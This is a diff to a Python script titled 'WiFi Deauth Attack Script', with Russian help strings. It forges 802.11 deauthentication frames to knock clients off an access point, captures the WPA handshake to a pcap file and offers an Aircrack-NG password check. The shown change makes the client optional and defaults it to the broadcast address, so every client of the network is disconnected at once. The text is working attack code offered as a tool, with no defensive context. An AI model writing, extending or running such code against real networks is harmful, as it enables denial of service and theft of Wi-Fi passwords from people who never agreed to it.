@@ -23,7 +23,7 @@ parser = argparse.ArgumentParser(description="WiFi Deauth Attack Script")
 parser.add_argument("-i", "--interface", required=True, help="Интерфейс для прослушивания (например, wlan0mon)")
 parser.add_argument("-c", "--channel", type=int, required=True, help="Канал WiFi (например, 11)")
 parser.add_argument("-b", "--bssid", required=True, help="BSSID точки доступа (например, 04:5e:a4:6a:28:47)")
-parser.add_argument("-s", "--client", required=True, help="MAC-адрес клиента (например, 80:32:53:ae:f8:b2)")
+parser.add_argument("-s", "--client", required=False, help="MAC-адрес клиента (например, 80:32:53:ae:f8:b2)")
 parser.add_argument("-w", "--pcap-file", required=True, help="Файл для сохранения handshake (например file.pcap)")
 parser.add_argument("-d", "--deauth-count", required=False, type=check_unsigned_int, default=5, help="Количество посылок деавторизации")
 parser.add_argument("-a", "--aircrack-check", required=False, action=argparse.BooleanOptionalAction, help="Проверка пароля при помощи Aircrack-NG")
@@ -42,9 +42,14 @@ class WiFiDeauth:
 	def __init__(self, interface, bssid, client, channel, deauth_count, pcap_file, aircrack_check, password):
 		self.interface = interface
 		self.bssid = bssid.lower()
-		self.client = client.lower()
+		
+		if client is None:
+			self.client = 'ff:ff:ff:ff:ff:ff'
+		else:
+			self.client = client.lower()
+
 		self.BSSID = bssid.upper()
-		self.CLIENT = client.upper()
+		self.CLIENT = self.client.upper()
 		self.pcap_file = pcap_file
 		
 		self.beacon_detect_flag = False
@@ -99,7 +104,12 @@ class WiFiDeauth:
 	def send_deauth(self):
 		pcap = pcapy.open_live(self.interface, 100, 1, 9)
 		for i in range(self.deauth_count):
-			print(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
+			
+			if self.client != 'ff:ff:ff:ff:ff:ff':
+				print(f"[+] Send deauth to {self.BSSID} as {self.CLIENT} ({i +1} / {self.deauth_count})")
+			else:
+				print(f"[+] Send deauth to broadcast as {self.BSSID}")
+				
 			self.current_deauth = i
 			for pnt_num in range(self.deauth_packets):
 				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(pnt_num << 4)) / Dot11Deauth(reason=7))
